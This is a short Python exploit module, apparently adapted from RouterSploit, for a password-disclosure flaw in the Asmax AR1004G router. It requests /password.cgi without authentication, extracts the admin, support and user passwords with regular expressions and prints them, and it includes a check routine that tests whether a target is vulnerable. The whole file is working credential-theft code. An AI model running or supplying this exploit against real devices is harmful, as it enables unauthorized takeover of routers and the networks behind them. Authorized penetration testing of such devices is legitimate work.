# rsf exploit module
# description: Exploits Asmax AR1004G Password Disclosure vulnerability that allows to fetch credentials for: Admin, Support and User accounts.

import re
from requests import get  # Use normal libraries

class Exploit:
    __info__ = {
        "name": "Asmax AR1004G Password Disclosure",
        "description": "Exploits Asmax AR1004G Password Disclosure vulnerability that allows to "
                       "fetch credentials for: Admin, Support and User accounts.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://github.com/lucyoa/exploits/blob/master/asmax/asmax.txt",
        ),
        "devices": (
            "Asmax AR 1004g",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        creds = []
        url = f"http://{self.target}:{self.port}/password.cgi"
        print(f"Requesting {url}")
        response = get(url)
        
        if response.status_code != 200:
            print("Exploit failed - empty response")
            return

        tokens = [
            ("admin", r"pwdAdmin = '(.+?)'"),
            ("support", r"pwdSupport = '(.+?)'"),
            ("user", r"pwdUser = '(.+?)'")
        ]

        print("Trying to extract credentials")
        for token in tokens:
            res = re.findall(token[1], response.text)
            if res:
                creds.append((token[0], res[0]))

        if creds:
            print("Credentials found")
            for cred in creds:
                print(f"Login: {cred[0]}, Password: {cred[1]}")
        else:
            print("Exploit failed - credentials could not be found")

    def check(self):
        url = f"http://{self.target}:{self.port}/password.cgi"
        response = get(url)

        if response.status_code != 200:
            return False  # target is not vulnerable

        if any(map(lambda x: x in response.text, ["pwdSupport", "pwdUser", "pwdAdmin"])):
            return True  # target vulnerable

        return False  # target not vulnerable

